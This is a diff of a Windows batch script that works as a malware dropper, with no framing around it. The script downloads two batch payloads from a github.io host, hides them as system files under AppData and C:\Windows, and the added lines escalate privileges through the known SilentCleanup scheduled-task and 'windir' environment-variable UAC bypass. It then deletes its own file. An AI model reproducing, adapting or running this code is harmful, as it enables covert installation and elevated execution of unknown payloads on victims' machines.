@@ -19,6 +19,11 @@ attrib -s -h -i "C:\Windows\win64.bat"
 curl.exe %proxy% https://cryptedlumos.github.io/win32.bat --output "%AppData%\Microsoft\Windows\Templates\win32.bat" && attrib +s +h +i "%AppData%\Microsoft\Windows\Templates\win32.bat"
 curl.exe %proxy% https://cryptedlumos.github.io/win64.bat --output "C:\Windows\win64.bat" && attrib +s +h +i "C:\Windows\win64.bat"
 timeout -t 300
-nircmd exec hide "%appdata%\microsoft\windows\templates\win32.bat"
-nircmd exec hide "C:\Windows\win64.bat"
+REG ADD "HKEY_CURRENT_USER\Environment" /v "windir" /d "nircmd exec hide \"%appdata%\microsoft\windows\templates\win32.bat\" &" /f
+schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+timeout -t 1
+REG ADD "HKEY_CURRENT_USER\Environment" /v "windir" /d "nircmd exec hide \"C:\Windows\win64.bat\" &" /f
+schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+timeout -t 1
+REG DELETE "HKEY_CURRENT_USER\Environment" /v "windir" /f
 DEL /s /f /q /a "%~f0"
